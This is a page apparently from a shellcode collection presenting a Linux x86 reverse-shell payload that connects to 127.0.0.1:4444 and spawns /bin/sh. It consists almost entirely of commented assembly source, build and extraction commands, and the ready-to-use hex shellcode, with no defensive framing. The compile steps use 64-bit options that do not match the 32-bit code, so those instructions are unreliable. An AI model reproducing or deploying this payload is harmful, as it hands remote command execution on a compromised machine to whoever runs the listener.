---
layout: default
title: Pure Syscall Socket Reverse Shell (127.0.0.1:4444)
permalink: /shellcode/asm-21.html
os: Linux
arch: Intel x86
length: 79
---

# {{ page.title }}

---
**OS:** {{ page.os }}

**Architecture:** {{ page.arch }}

**Length:** {{ page.length }} bytes

---

## Assembly

```nasm
section .text
global _start

_start:
	xor ebx, ebx				; EBX = 0
	mul ebx					; EAX, EDX = 0

	; socketcall SYS_SOCKET syscall setup
	mov al, 0x66				; EAX = 0x66 (socketcall syscall setup)
	mov bl, 0x1				; EBX = 0x1, (SYS_SOCKET)
	push edx				; Push 0x0 (Protocol)
	push byte 0x1				; Push 0x1 (SOCK_STREAM)
	push byte 0x2				; Push 0x2 (AF_INET)
	mov ecx, esp				; ECX -> {0x0, 0x1, 0x2}
	int 0x80

	; socketcall SYS_CONNECT syscall setup
	xchg eax, edx				; EDX = socket fd, EAX = 0
	mov al, 0x66				; EAX = 0x66 (socketcall syscall setup)
	mov bl, 0x3				; EBX = 0x3 (SYS_CONNECT)

	mov ecx, 0xfeffff81			; Negated IP ("127.0.0.1")
	neg ecx					; Negate ECX
	push ecx				; Push IP ("127.0.0.1")

	mov ecx, 0xa3eefffe			; Negated family + port ("AF_INET + 4444")
	neg ecx					; Negate ECX
	push ecx				; Push family + port

	mov ecx, esp				; ECX -> {"127.0.0.1", "AF_INET", 4444}

	push byte 16				; Push length of sockaddr (16 bytes)
	push ecx				; Push pointer to sockaddr {"127.0.0.1", "AF_INET", 4444}
	push edx				; Push socket fd

	mov ecx, esp				; ECX -> {socket fd, {sockaddr}, 16}
	int 0x80

	; STDIN, STDOUT, STDERR file-descriptor setup
	xor ecx, ecx				; ECX = 0
	mov cl, 0x2				; ECX = 0x2

	dup_loop:
		mov al, 0x3f			; RAX = 0x3f (dup2 syscall number)
		int 0x80
		dec ecx				; Decrement ECX (1, 0, -1)
	jns dup_loop				; Jump to dup_loop if not sign (not negative)

	; execve
	inc ecx					; ECX = 0
	xor edx, edx				; EDX = 0
	mov al, 0xb				; EAX = 0xb (execve syscall number)

	push edx				; Push null terminator
	push 0x68732f2f				; Push "//sh"
	push 0x6e69622f				; Push "/bin"
	mov ebx, esp				; EBX -> "/bin//sh"
	int 0x80				; Execute execve
```

## Compilation and Linking

```bash
# Assemble
nasm -f elf64 -o code.o code.asm

# Link
ld -m elf_x86_64 -s -o code code.o

# Extract Shellcode
printf '\\x' && objdump -d code | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '
```

## Shellcode

```
\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\xb3\x03\xb9\x81\xff\xff\xfe\xf7\xd9\x51\xb9\xfe\xff\xee\xa3\xf7\xd9\x51\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x41\x31\xd2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
```